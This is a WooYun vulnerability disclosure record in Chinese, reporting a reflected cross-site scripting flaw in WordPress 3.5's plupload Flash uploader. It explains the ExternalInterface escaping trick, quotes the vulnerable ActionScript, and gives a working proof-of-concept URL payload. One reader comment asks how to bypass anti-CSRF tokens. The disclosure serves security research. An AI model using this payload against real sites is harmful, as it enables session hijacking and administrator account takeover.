{"id": 14416, "wybug_id": "wooyun-2013-017189", "wybug_title": "Flash应用安全系列[3]--WordPress反射型跨站(0day)", "wybug_corp": "WordPress", "wybug_author": "p.z", "wybug_date": "2013-01-11 11:03", "wybug_open_date": "2013-02-25 11:03", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "应用安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2013-02-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： WordPress3.5某处Flash应用存在漏洞，可能导致跨站脚本攻击。当一个已经登录后台的会话访问某一特定网页时，攻击者精心构造的payload可以在后台添加一个同等权限的用户，并写入Shell（如果权限允许的话）。http://player.youku.com/player.php/sid/XNTAwMjY0MzQ4/v.swf 详细说明：  这种类型的漏洞是Google的大牛Michal Zalewski最先公开的，我这里就简单说明下。(原文 The other reason to beware ExternalInterface.call() -- http://lcamtuf.blogspot.com/2011/03/other-reason-to-beware-of.html)as脚本运行flash.external.ExternalInterface.call($methodName, $parameter)时，flash player会调用HTML的js，运行\ntry { __flash__toXML($methodName(\"$parameter\")) ; } catch (e) { \"<undefined/>\"; }\n如果我们试着尝试在$parameter中加入\" 如flash.external.ExternalInterface.call(\"alert\",'\"2')，js运行的是\ntry { __flash__toXML(alert(\"\\\"2\")) ; } catch (e) { \"<undefined/>\"; }\nflash player会对\"进行转义，但搞笑的是对于传入的\\，flash player却原样输出了，如此一来，我们就可以利用传入的\\去转义原本用来转义\"的转义符\\。flash.external.ExternalInterface.call(\"alert\",'\\\\\"2')\ntry { __flash__toXML(alert(\"\\\\\"2\")) ; } catch (e) { \"<undefined/>\"; }\n剩下的就是闭合)}这类的事情了\nflash.external.ExternalInterface.call(\"alert\",'\\\\\"2))}catch(e){alert(3)//')try { __flash__toXML(alert(\"\\\\\"2))}catch(e){alert(3)//}\")) ; } catch (e) { \"<undefined/>\"; }\nVulnerable SWF File: /wp-includes/js/plupload/plupload.flash.swfVulnerable Code:com.plupload.Plupload\nprivate function init(event:Event = null) : void{\tremoveEventListener(Event.ADDED_TO_STAGE, this.init);\tthis.id = this.stage.loaderInfo.parameters[\"id\"];\t...\tthis.fireEvent(\"Init\");\treturn;}// end function...private function fireEvent(param1:String, param2:Object = null) : void{\tExternalInterface.call(\"plupload.flash.trigger\", this.id, param1, param2);\treturn;}// end function\n原始SWF下载：http://swfpoc.appspot.com/vul/wordpress_plupload.flash.swf   漏洞证明：  Proof of Concept:http://wordpress/wp-includes/js/plupload/plupload.flash.swf?id=0\\\"))}catch(e){if(!window.x){window.x=1;alert(2)}}//   修复方案：     版权声明：转载请注明来源 p.z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2013-01-11 11:13 |    \t\tcnrstar \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:23        | Be my personal best!)\t\t \n  给力`~!    \n     2013-01-11 11:48 |    \t\tSogili \t\t\t( 普通白帽子  |\t\t\t        Rank:129 漏洞数:27        )\t\t \n  关注 %%%%%    \n     2013-01-13 13:05 |    \t\t空城 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:11        | 这个人很懒，什么也没有留下)\t\t \n  Mark    \n     2013-01-13 21:02 |    \t\tZvall \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:14        | hello world)\t\t \n  Mark    \n     2013-03-09 06:47 |    \t\t苏南同学 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:5        | 苏南同学，就是苏南同学~~~)\t\t \n  学习了    \n     2013-03-24 00:11 |    \t\t空城 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:11        | 这个人很懒，什么也没有留下)\t\t \n  @p.z Anti-CSRF令牌怎么bypass 求教育    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}